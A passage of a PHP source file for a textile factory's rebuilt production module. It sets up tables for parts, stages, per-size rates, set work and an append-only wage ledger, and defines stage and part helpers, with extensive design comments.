<?php
/*
  ZAS PRODUCTION — REBUILT FROM SCRATCH.
  ======================================

  Asked for after two days lost to the old module. This replaces the production
  and part screens only. Costing, invoicing, shipments, inventory and everything
  else in the app are untouched and do not know this file exists.

  THREE RULES THIS FILE IS BUILT ON
  ---------------------------------

  1. THE MASTER PRODUCT TABLE IS NOT TOUCHED. `products` is read, never
     dropped, never emptied. Your 26 products stay exactly where they are.

  2. NEW TABLES, NOT REUSED ONES. Every table here is prefixed `zp_`. The old
     production_* and part_library_* tables are left on disk, untouched. That
     means this rebuild starts genuinely empty — no half-migrated rows, no old
     rates leaking in — and if anything is ever needed back from the old data,
     it is still there to read. A rebuild that overwrites the thing it replaces
     cannot be undone; this one can.

  3. THREE STAGES, AND NO PACKING. Cutting, Manual Cutting, Stitching. Dispatch
     is gone, as asked. Manual Cutting is a second cutting line for the special
     case in your layout — it is a real stage, not a label, so its wage is
     counted separately and you can see what hand cutting is costing you.

  Every CREATE is `IF NOT EXISTS` and every ALTER is wrapped, so this file can
  run on every page load forever without ever doing damage.
*/

function zp_ensure_schema(): void {
    static $done = false;
    if ($done) return;
    $done = true;

    /* ---- THE PRODUCTS TABLE IS READ, NEVER CREATED AND NEVER EMPTIED.
       The only thing done to it is making sure the two columns the CSV round
       trip needs actually exist. Both are additive and nullable, so on a
       database that already has them this does nothing at all. If `products`
       itself were missing, that is a far bigger problem than this module and
       must not be papered over by quietly creating an empty one. */
    try { db()->exec("ALTER TABLE products ADD COLUMN description VARCHAR(255) NULL AFTER name"); } catch (Throwable $e) {}
    try { db()->exec("ALTER TABLE products ADD COLUMN fcl_40hc_qty DECIMAL(12,2) NULL DEFAULT 0"); } catch (Throwable $e) {}

    /* ---- the parts you make: Bed Sheet, Pillow Cover, Packing Bag ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_parts (
        id INT AUTO_INCREMENT PRIMARY KEY,
        part_name VARCHAR(120) NOT NULL,
        uom VARCHAR(20) NOT NULL DEFAULT 'Pc',
        style VARCHAR(80) NULL,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME NULL,
        UNIQUE KEY uniq_part_name (part_name),
        INDEX(is_active)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- what is done to a part, in order, and what each step pays ----
       seq keeps the order you typed. stage is one of zp_stages().
       A part's FIRST row is always its Cutting row — see zp_save_part_ops(). */
    /* ---- THE STAGES, typed by you, in the order work reaches them ----
       SEEDED EXACTLY ONCE, and only on the very first run. The check is made
       BEFORE the CREATE, because CREATE IF NOT EXISTS cannot tell you whether
       it built the table or found it. Seeding on "empty" instead would bring
       two stages back from the dead every time somebody cleared the list, and
       that is the kind of thing that makes an app feel haunted. */
    $stageTableExisted = false;
    try { db()->query("SELECT 1 FROM zp_stage LIMIT 1"); $stageTableExisted = true; } catch (Throwable $e) {}
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_stage (
        id INT AUTO_INCREMENT PRIMARY KEY,
        seq INT NOT NULL DEFAULT 0,
        name VARCHAR(60) NOT NULL,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_stage_name (name),
        INDEX(seq)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
    if (!$stageTableExisted) {
        try {
            $s = db()->prepare("INSERT INTO zp_stage (seq, name) VALUES (?,?)");
            $s->execute([1, 'Cutting']);
            $s->execute([2, 'Stitching']);
        } catch (Throwable $e) {}
    }

    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_part_ops (
        id INT AUTO_INCREMENT PRIMARY KEY,
        part_id INT NOT NULL,
        seq INT NOT NULL DEFAULT 0,
        stage VARCHAR(60) NULL DEFAULT NULL,
        operation_name VARCHAR(120) NOT NULL,
        rate DECIMAL(12,2) NOT NULL DEFAULT 0,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX(part_id), INDEX(stage)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
    /* THE STAGE IS HELD BY ID, NOT BY ITS SPELLING — that is what makes
       renaming a stage safe. The older `stage` text column is still written
       alongside it so the screens not yet converted keep reading; the id is
       what every rule is decided on. */
    try { db()->exec("ALTER TABLE zp_part_ops ADD COLUMN stage_id INT NULL DEFAULT NULL AFTER part_id"); } catch (Throwable $e) {}
    /* WIDENED FROM VARCHAR(20), AND THAT WAS A REAL BUG WAITING.
       A stage name may be 60 characters. Written into a 20-character column,
       "Second Stitching Line Overlock" would have been CUT SHORT — silently in
       loose mode, and the shortened text then matches no stage at all. It is the
       same silent-truncation failure as the old ENUM, one column along. The
       default is dropped with it: a row's stage comes from stage_id, and a
       column that quietly fills itself in with a stage name is not a default,
       it is a guess. */
    try { db()->exec("ALTER TABLE zp_part_ops MODIFY stage VARCHAR(60) NULL DEFAULT NULL"); } catch (Throwable $e) {}
    try { db()->exec("CREATE INDEX idx_zpo_stage ON zp_part_ops (stage_id)"); } catch (Throwable $e) {}

    /* ---- THE SHARED SIZE LIST lives in product_sizes, which Costing, Proforma
       and fourteen other files already read. Two columns are added to it, both
       nullable, so no existing row anywhere can be rejected:
         sort_order         so Product Master can order the list
         product_size_id    on proforma_items, so an order line REMEMBERS which
                            size it is instead of being matched back by text ---- */
    try { db()->exec("ALTER TABLE product_sizes ADD COLUMN sort_order INT NOT NULL DEFAULT 0"); } catch (Throwable $e) {}
    try { db()->exec("ALTER TABLE proforma_items ADD COLUMN product_size_id INT NULL DEFAULT NULL"); } catch (Throwable $e) {}
    try { db()->exec("CREATE INDEX idx_pi_size ON proforma_items (product_size_id)"); } catch (Throwable $e) {}

    /* ---- the OLD production-only size table. Nothing reads it any more; it is
       kept on disk untouched because it is the only record of what was typed
       before the two lists were merged. ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_sizes (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        size_label VARCHAR(60) NOT NULL,
        sort_order INT NOT NULL DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_product_size (product_id, size_label),
        INDEX(product_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- which parts go into a product ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_product_parts (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        part_id INT NOT NULL,
        sort_order INT NOT NULL DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_product_part (product_id, part_id),
        INDEX(product_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- HOW MANY of that part go into ONE set, per size.
       This is the grid in your layout: Double pillow = 2, Sheet = 1.
       A missing row means 1, not 0 — see zp_qty_map(). A part that is in the
       product is in it at least once; storing that as a blank would make a
       product silently produce nothing. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_part_qty (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        part_id INT NOT NULL,
        size_id INT NOT NULL,
        qty DECIMAL(10,2) NOT NULL DEFAULT 1,
        UNIQUE KEY uniq_ppq (product_id, part_id, size_id),
        INDEX(product_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- A RATE THAT IS DIFFERENT FOR ONE SIZE ----
       Deliberately the SAME SHAPE as zp_part_qty above: product + thing + size,
       and NO ROW MEANS THE DEFAULT. There, the default is 1 per set; here it is
       the operation's own rate on zp_part_ops. An empty table therefore behaves
       exactly as the app did before this existed, which is what makes adding it
       safe.

       WHY THE KEY CARRIES product_id WHEN part_op_id ALREADY IMPLIES A PART.
       A part is a shared library row — zp_parts.part_name is UNIQUE, so "Flat
       Sheet" is ONE row used by every product that has one. Its rate is shared
       on purpose. A SIZE, though, belongs to exactly one product, so keying on
       the size alone would already scope this to a product. product_id is
       carried anyway so "what has this product overridden?" needs no join and
       cleanup is one DELETE — the same reasons zp_part_qty carries it.

       A King flat sheet has more running metres of seam than a Single, so it
       genuinely costs more to overlock. That is the case this exists for; it
       is NOT for pieces-per-set, which zp_part_qty already handles. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_op_rate (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        part_op_id INT NOT NULL,
        size_id INT NOT NULL,
        rate DECIMAL(12,2) NOT NULL,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME NULL,
        UNIQUE KEY uniq_por (product_id, part_op_id, size_id),
        INDEX(product_id), INDEX(size_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- the people on the machines ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_workers (
        id INT AUTO_INCREMENT PRIMARY KEY,
        worker_code VARCHAR(20) NOT NULL,
        worker_name VARCHAR(120) NOT NULL,
        department VARCHAR(60) NULL,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_worker_code (worker_code),
        INDEX(worker_name)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
    /* A WORKER CODE IS AN EMPLOYEE NUMBER FROM SOMEWHERE ELSE, and somewhere
       else does not ask us how long its numbers may be. VARCHAR(20) was
       chosen when the only codes were the W001 this screen gives out; a real
       HR employee number is longer, and 20 characters is a trap rather than
       a limit:

         MySQL outside strict mode CUTS a long value to fit and says nothing.
         Two people whose numbers differ only after the twentieth character
         then become the same code — and the unique key means the second one
         simply fails to import, with a message blaming a collision that the
         truncation itself created.

       Widened to 40, which is longer than any employee number anybody has
       ever shown me, and ZP_CODE_MAX below refuses anything longer rather
       than trusting the database to complain. utf8mb4 VARCHAR(40) is 160
       bytes of index, nowhere near any limit. */
    try { db()->exec("ALTER TABLE zp_workers MODIFY worker_code VARCHAR(40) NOT NULL"); } catch (Throwable $e) {}

    /* ============================================================
       SET WORK — the jobs done to the whole set, not to any one part
       ============================================================

       Folding, matching, poly bag, hangtag, carton, tape. It is work on the
       SET, and until now an operation could only belong to a PART, so that
       pay was either never booked or stuck onto some part it was never done
       to — and Costing priced a set on part work alone, which understated
       every quote by the whole of its packing labour.

       THE PRODUCT GIVES THE LIST; AN ORDER MAY TAKE ITS OWN COPY.

       zp_set_ops       what this product normally needs. Typed once.
       zp_line_set_ops  one order LINE's own version of that list, and it
                        exists ONLY for the lines somebody pressed the button
                        on. No rows means the line follows the product, which
                        is why nothing has to be migrated and why nine orders
                        in ten need no typing at all.

       WHY THE COPY IS PER LINE AND NOT PER ORDER. One proforma can carry a
       comforter set and a sheet set. Set work belongs to a product, so a
       list hung on the order would have to guess which of them it meant. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_set_ops (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        seq INT NOT NULL DEFAULT 0,
        stage_id INT NULL DEFAULT NULL,
        operation_name VARCHAR(120) NOT NULL,
        rate DECIMAL(12,2) NOT NULL DEFAULT 0,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX(product_id), INDEX(stage_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* set_op_id says where a line came from:
         a number — it came from the product's list, kept, possibly re-rated,
                    possibly switched off with is_active=0
         NULL     — it was added for this order and exists nowhere else
       SWITCHED OFF, NEVER DELETED. Dropping the row would make the line
       follow the product again on the next read, which is the opposite of
       what "not on this order" means. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_line_set_ops (
        id INT AUTO_INCREMENT PRIMARY KEY,
        proforma_item_id INT NOT NULL,
        set_op_id INT NULL DEFAULT NULL,
        seq INT NOT NULL DEFAULT 0,
        stage_id INT NULL DEFAULT NULL,
        operation_name VARCHAR(120) NOT NULL,
        rate DECIMAL(12,2) NOT NULL DEFAULT 0,
        is_active TINYINT(1) NOT NULL DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX(proforma_item_id), INDEX(set_op_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* A RATE THAT IS DIFFERENT FOR ONE SIZE, for set work.
       Same shape as zp_op_rate for parts — and it has to be its OWN table
       rather than a `kind` column on that one, because zp_part_ops.id and
       zp_set_ops.id are two independent id spaces. One row keyed (product,
       op, size) with no way to tell which op it meant is the kind of
       collision that pays the wrong rate and is never traced. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_set_op_rate (
        id INT AUTO_INCREMENT PRIMARY KEY,
        product_id INT NOT NULL,
        set_op_id INT NOT NULL,
        size_id INT NOT NULL,
        rate DECIMAL(12,2) NOT NULL,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME NULL,
        UNIQUE KEY uniq_sor (product_id, set_op_id, size_id),
        INDEX(product_id), INDEX(size_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* WHICH TABLE op_id POINTS AT.
       zp_part_ops, zp_set_ops and zp_line_set_ops each number their rows
       from 1, so op_id alone stopped being unique the moment set work
       existed. 'part' is the default, so EVERY row already in the ledger
       keeps exactly the meaning it has today and nothing needs migrating. */
    try { db()->exec("ALTER TABLE zp_entries ADD COLUMN op_kind VARCHAR(8) NOT NULL DEFAULT 'part' AFTER op_id"); } catch (Throwable $e) {}
    try { db()->exec("CREATE INDEX idx_opkind ON zp_entries (op_kind, op_id)"); } catch (Throwable $e) {}

    /* ---- WHICH STAGES A WORKER ACTUALLY WORKS ----
       On a floor of three hundred people, offering all three hundred for a
       piping job is not a list, it is a haystack. A worker may be allotted any
       number of stages and the entry screen then offers those people first.

       NO ROW MEANS EVERY STAGE, NOT NO STAGE. This is the whole reason the
       table is safe to add: the day it ships it is empty, so every worker is
       offered exactly as they are today, and the short list appears person by
       person as you fill it in. The opposite default would hide your entire
       floor the moment the file was uploaded.

       The stage is held by id, like everywhere else in this module, so
       renaming a stage never loses an allotment. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_worker_stage (
        id INT AUTO_INCREMENT PRIMARY KEY,
        worker_id INT NOT NULL,
        stage_id INT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_ws (worker_id, stage_id),
        INDEX(worker_id), INDEX(stage_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- the wage ledger ----
       rate_applied IS A SNAPSHOT AND IS NEVER RECALCULATED. The rate that was
       in force the moment this was booked is frozen onto the row. Change a rate
       tomorrow and every wage already paid stays exactly as it was paid. This
       single column is what makes the rate history safe to edit.

       status: 'active' or 'cancelled'. NOTHING IS EVER DELETED from this
       table — a cancelled entry keeps its row so the correction is visible. */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_entries (
        id INT AUTO_INCREMENT PRIMARY KEY,
        entry_date DATE NOT NULL,
        worker_id INT NOT NULL,
        proforma_id INT NULL,
        proforma_item_id INT NULL,
        product_id INT NOT NULL,
        part_id INT NULL,
        op_id INT NOT NULL,
        stage_id INT NULL,
        stage VARCHAR(60) NULL,
        qty DECIMAL(12,2) NOT NULL,
        rate_applied DECIMAL(12,2) NOT NULL,
        amount DECIMAL(14,2) NOT NULL,
        status VARCHAR(12) NOT NULL DEFAULT 'active',
        note VARCHAR(255) NULL,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        cancelled_by INT NULL,
        cancelled_at DATETIME NULL,
        cancel_reason VARCHAR(255) NULL,
        INDEX(entry_date), INDEX(worker_id), INDEX(product_id),
        INDEX(op_id), INDEX(status), INDEX(proforma_item_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
    /* THE WAGE LEDGER CARRIES THE STAGE BY ID TOO, and for the same reason as
       the operations: a paid wage must still know which stage it was paid for
       after that stage is renamed. The text column beside it was VARCHAR(20),
       which would have quietly cut any stage name longer than twenty letters
       and left the wage filed under a stage that matches nothing. */
    try { db()->exec("ALTER TABLE zp_entries ADD COLUMN stage_id INT NULL DEFAULT NULL AFTER op_id"); } catch (Throwable $e) {}
    try { db()->exec("ALTER TABLE zp_entries MODIFY stage VARCHAR(60) NULL DEFAULT NULL"); } catch (Throwable $e) {}
    try { db()->exec("CREATE INDEX idx_zpe_stage ON zp_entries (stage_id)"); } catch (Throwable $e) {}

    /* ---- one order pays a different rate for one operation ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_order_rates (
        id INT AUTO_INCREMENT PRIMARY KEY,
        proforma_id INT NOT NULL,
        op_id INT NOT NULL,
        rate DECIMAL(12,2) NOT NULL,
        reason VARCHAR(255) NOT NULL,
        created_by INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY uniq_order_op (proforma_id, op_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}

    /* ---- every rate that ever moved, and who moved it ---- */
    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_rate_log (
        id INT AUTO_INCREMENT PRIMARY KEY,
        op_id INT NULL,
        proforma_id INT NULL,
        part_name VARCHAR(120) NULL,
        operation_name VARCHAR(120) NULL,
        old_rate DECIMAL(12,2) NULL,
        new_rate DECIMAL(12,2) NOT NULL,
        reason VARCHAR(255) NULL,
        user_id INT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX(op_id), INDEX(created_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
}

/* ============================================================
   STAGES
   ============================================================

   Three, and no packing step. Cutting is where a part starts and is what sets
   its production limit. Manual Cutting is the second cutting line from your
   layout — hand cutting for the odd shape — kept as its OWN stage rather than
   a second row called "Cutting", so that at the end of the month you can see
   what hand cutting cost you without unpicking it from machine cutting.
   Stitching is everything after. */
/* ============================================================
   STAGES — YOUR WORDS, YOUR ORDER
   ============================================================

   These used to be three words written into this line: Cutting, Manual Cutting,
   Stitching. That was the mistake behind most of the trouble — the factory
   works how it works, and every time it did not match, the code had to change.
   Worse, the old costing table only ever accepted three specific words, so a
   fourth was thrown away without an error.

   Now you type them, on the Production Stages screen, and they live in zp_stage.

   POSITION CARRIES THE ONLY RULE. The stage at the top makes the pieces — not
   because of what it is called, but because it is first. It is limited by the
   order quantity. Everything below it can only be booked on pieces that already
   exist, which is what stops 500 being stitched when 300 were cut.

   Names carry no rule at all, so renaming one never moves a wage: work is
   booked against the stage's id, never against its spelling. */

function zp_stage_all(bool $activeOnly = false): array {
    zp_ensure_schema();
    static $cache = [];
    $k = $activeOnly ? 'on' : 'all';
    if (isset($cache[$k])) return $cache[$k];
    $sql = "SELECT * FROM zp_stage" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY seq, id";
    try { $cache[$k] = db()->query($sql)->fetchAll(); } catch (Throwable $e) { $cache[$k] = []; }
    return $cache[$k];
}

/* THE STAGE THAT MAKES THE PIECES = the first ACTIVE one.
   Active matters: a stage switched off is not part of the flow any more, and
   treating a dead row as the piece-maker would cap every later stage at zero. */
function zp_stage_first(): ?array {
    $on = zp_stage_all(true);
    return $on ? $on[0] : null;
}
function zp_stage_first_id(): int { $f = zp_stage_first(); return $f ? (int)$f['id'] : 0; }
function zp_stage_is_first(int $stageId): bool { return $stageId > 0 && $stageId === zp_stage_first_id(); }

function zp_stage_by_id(int $id): ?array {
    foreach (zp_stage_all() as $s) if ((int)$s['id'] === $id) return $s;
    return null;
}
/* A STAGE THAT WAS DELETED STILL HAS TO PRINT SOMETHING. Returning '' would
   make a paid wage look like it belonged to no stage at all. */
function zp_stage_name(int $id): string {
    $s = zp_stage_by_id($id);
    return $s ? (string)$s['name'] : '(removed stage)';
}

/* THE STAGE BEFORE THIS ONE — the thing that limits it.
   Null for the first stage, which is limited by the order instead. */
function zp_stage_prev(int $stageId): ?array {
    $on = zp_stage_all(true);
    foreach ($on as $i => $s) if ((int)$s['id'] === $stageId) return $i > 0 ? $on[$i - 1] : null;
    return null;
}

/* ---- the screens that have not been converted yet still speak in names ----
   These two keep every unconverted screen correct under the new model without
   editing it: the dropdowns now list YOUR stages, and "is this the one that
   makes the pieces" is answered by position instead of by the word 'Cutting'. */
function zp_stages(): array { return array_column(zp_stage_all(true), 'name'); }

function zp_is_cutting(string $stage): bool {
    $f = zp_stage_first();
    return $f !== null && mb_strtolower(trim($stage)) === mb_strtolower((string)$f['name']);
}

/* An unknown stage name snaps to the SECOND stage, not the first. Guessing the
   first would quietly hand a row the power to create pieces. */
function zp_stage_clean(?string $s): string {
    $s = trim((string)$s);
    $on = zp_stage_all(true);
    foreach ($on as $r) if (mb_strtolower($r['name']) === mb_strtolower($s)) return (string)$r['name'];
    if (isset($on[1])) return (string)$on[1]['name'];
    return $on ? (string)$on[0]['name'] : '';
}

/* The id behind a typed or posted stage name — '' when it matches nothing, so
   a caller must decide, rather than being handed a silent default. */
function zp_stage_id_for(?string $name): int {
    $name = mb_strtolower(trim((string)$name));
    if ($name === '') return 0;
    foreach (zp_stage_all() as $s) if (mb_strtolower($s['name']) === $name) return (int)$s['id'];
    return 0;
}

/* ============================================================
   PART CODES — P001, P002, ...
   ============================================================

   The code is DERIVED from the id, never stored. A stored code is one more
   thing to keep unique, to renumber, and to get wrong; the id is already
   unique and already permanent. P001 is simply how id 1 is written down. */
function zp_part_code(int $id): string { return 'P' . str_pad((string)$id, 3, '0', STR_PAD_LEFT); }

/* Accepts P001, p1, #1 or 1 — because people type all four. */
function zp_part_id_from(string $s): int {
    $s = trim($s);
    if ($s === '') return 0;
    if (preg_match('/^[Pp#]?0*(\d+)$/', $s, $m)) return (int)$m[1];
    return 0;
}

/* ============================================================
   PARTS
   ============================================================ */

function zp_parts(bool $activeOnly = false): array {
    zp_ensure_schema();
    $sql = "SELECT * FROM zp_parts" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY id";
    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
}

function zp_part(int $id): ?array {
    if ($id <= 0) return null;
    zp_ensure_schema();
    $st = db()->prepare("SELECT * FROM zp_parts WHERE id=?");
    $st->execute([$id]);
    $r = $st->fetch();
    return $r ?: null;
}

/* Returns [ok, id, error]. A duplicate NAME is refused rather than silently
   creating a second "Bed Sheet" that half your products point at. */
function zp_save_part(int $id, string $name, string $uom, ?string $style, int $active, ?int $userId = null): array {
    zp_ensure_schema();
    $name = trim($name);
    $uom  = trim($uom) !== '' ? trim($uom) : 'Pc';
    $style = ($style === null || trim($style) === '') ? null : trim($style);
    if ($name === '') return ['ok' => false, 'id' => 0, 'error' => 'Part name is required.'];

    $dup = db()->prepare("SELECT id FROM zp_parts WHERE part_name=? AND id<>?");
    $dup->execute([$name, $id]);
    if ($dup->fetchColumn()) {
        return ['ok' => false, 'id' => 0, 'error' => 'A part called "' . $name . '" already exists. Open that one instead of making a second.'];
    }

    if ($id > 0) {
        db()->prepare("UPDATE zp_parts SET part_name=?, uom=?, style=?, is_active=?, updated_at=NOW() WHERE id=?")
            ->execute([$name, $uom, $style, $active ? 1 : 0, $id]);
        return ['ok' => true, 'id' => $id, 'error' => ''];
    }
    db()->prepare("INSERT INTO zp_parts (part_name, uom, style, is_active, created_by) VALUES (?,?,?,?,?)")
        ->execute([$name, $uom, $style, $active ? 1 : 0, $userId]);
    return ['ok' => true, 'id' => (int)db()->lastInsertId(), 'error' => ''];
}

/* A part that is used by a product is DEACTIVATED, never deleted — deleting it
   would leave that product pointing at nothing and its wages orphaned. The
   caller is told which it was so the screen can say so. */
function zp_delete_part(int $id): array {
    zp_ensure_schema();
    $used = db()->prepare("SELECT COUNT(*) FROM zp_product_parts WHERE part_id=?");
    $used->execute([$id]);
    $booked = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE part_id=? AND status='active'");
    $booked->execute([$id]);
    if ((int)$used->fetchColumn() > 0 || (int)$booked->fetchColumn() > 0) {
        db()->prepare("UPDATE zp_parts SET is_active=0, updated_at=NOW() WHERE id=?")->execute([$id]);
        return ['ok' => true, 'deleted' => false,
                'msg' => 'That part is in use, so it has been deactivated instead of deleted. Nothing that points at it was harmed.'];
    }
    db()->prepare("DELETE FROM zp_part_ops WHERE part_id=?")->execute([$id]);
    db()->prepare("DELETE FROM zp_parts WHERE id=?")->execute([$id]);
    return ['ok' => true, 'deleted' => true, 'msg' => 'Part deleted.'];
}

function zp_duplicate_part(int $id, ?int $userId = null): array {
    zp_ensure_schema();
    $src = zp_part($id);
    if (!$src) return ['ok' => false, 'id' => 0, 'error' => 'That part no longer exists.'];

    /* "Bed Sheet" -> "Bed Sheet (Copy)" -> "Bed Sheet (Copy 2)" ... */
    $base = $src['part_name'] . ' (Copy';
    $name = $base . ')'; $n = 2;
    while (true) {
        $c = db()->prepare("SELECT COUNT(*) FROM zp_parts WHERE part_name=?");
        $c->execute([$name]);
        if (!(int)$c->fetchColumn()) break;
        $name = $base . ' ' . $n . ')'; $n++;
        if ($n > 60) return ['ok' => false, 'id' => 0, 'error' => 'Too many copies of that part already.'];
    }

    db()->prepare("INSERT INTO zp_parts (part_name, uom, style, is_active, created_by) VALUES (?,?,?,1,?)")
        ->execute([$name, $src['uom'], $src['style'], $userId]);
    $newId = (int)db()->lastInsertId();

    /* the operations come with it — a copy with no operations is not a copy */
    $ops = db()->prepare("SELECT seq, stage, operation_name, rate, is_active FROM zp_part_ops WHERE part_id=? ORDER BY seq, id");
    $ops->execute([$id]);
    $ins = db()->prepare("INSERT INTO zp_part_ops (part_id, seq, stage, operation_name, rate, is_active) VALUES (?,?,?,?,?,?)");
    foreach ($ops->fetchAll() as $o) {
        $ins->execute([$newId, (int)$o['seq'], $o['stage'], $o['operation_name'], $o['rate'], (int)$o['is_active']]);
    }
    return ['ok' => true, 'id' => $newId, 'error' => ''];
}

/* ============================================================
   PART OPERATIONS
   ============================================================ */

function zp_part_ops(int $partId, bool $activeOnly = false): array {
    if ($partId <= 0) return [];
    zp_ensure_schema();
    $sql = "SELECT * FROM zp_part_ops WHERE part_id=?" . ($activeOnly ? " AND is_active=1" : "") . " ORDER BY seq, id";
    $st = db()->prepare($sql);
    $st->execute([$partId]);
    return $st->fetchAll();
}

/* Save the whole grid for one part in one go.
 *
 * $rows = [ ['id'=>int, 'stage'=>string, 'name'=>string, 'rate'=>float], ... ]
 * in the order shown on screen.
 *
 * WHY THE WHOLE GRID AND NOT ROW BY ROW: the order of the rows IS information
 * (it is the order the work happens in), and a row-at-a-time save cannot
 * express "row 3 moved above row 2". Replacing the set in one transaction also
 * means a half-saved grid is impossible.
 *
 * A row whose operation has WAGES BOOKED AGAINST IT is never deleted — it is
 * deactivated, so the wage keeps its operation name on every report.
 */
function zp_save_part_ops(int $partId, array $rows, string $reason = '', ?int $userId = null): array {
    zp_ensure_schema();
    if ($partId <= 0) return ['ok' => false, 'error' => 'No part selected.'];
    $part = zp_part($partId);
    if (!$part) return ['ok' => false, 'error' => 'That part no longer exists.'];

    /* NOTHING CAN BE PRICED UNTIL THE STAGES EXIST. Saving into an empty stage
       list would leave every operation belonging to no stage, and no report
       could ever say what it was. */
    $stageRows = zp_stage_all(true);
    if (!$stageRows)
        return ['ok' => false, 'error' => 'Set up your production stages first — an operation has to belong to one.'];
    $firstStage = $stageRows[0];

    /* ---- check everything BEFORE writing anything ---- */
    $clean = []; $seq = 0;
    foreach ($rows as $i => $r) {
        $name = trim((string)($r['name'] ?? ''));
        /* the id is what counts; the posted name is only a fallback for a form
           that has not been converted to send ids yet */
        $sid  = (int)($r['stage_id'] ?? 0);
        if ($sid <= 0) $sid = zp_stage_id_for((string)($r['stage'] ?? ''));
        $rate = (float)str_replace(',', '', (string)($r['rate'] ?? 0));
        $rid  = (int)($r['id'] ?? 0);
        if ($name === '' && $rate <= 0) continue;                 // an untouched blank row
        if ($name === '')  return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' has a rate but no operation name.'];
        if ($rate <= 0)    return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' ("' . $name . '") needs a rate above 0.'];
        if ($sid <= 0 || !zp_stage_by_id($sid))
            return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' ("' . $name . '") has no stage. Pick one from the list.'];
        $clean[] = ['id' => $rid, 'seq' => $seq++, 'stage_id' => $sid,
                    'stage' => zp_stage_name($sid), 'name' => $name, 'rate' => round($rate, 2)];
    }
    if (!$clean) return ['ok' => false, 'error' => 'Add at least one operation before saving.'];

    /* THE FIRST LINE IS THE FIRST STAGE. Not because of what it is called —
       because the first stage is what makes the pieces, and every stage after
       it is capped by what already exists. A part whose first line sat at a
       later stage would have no ceiling at all. */
    if ((int)$clean[0]['stage_id'] !== (int)$firstStage['id']) {
        return ['ok' => false, 'error' => 'The first line must be "' . $firstStage['name']
              . '" — it is the stage that makes the pieces, so everything else is limited by it.'];
    }

    /* two lines with the same name at the same stage would double-count */
    $seen = [];
    foreach ($clean as $c) {
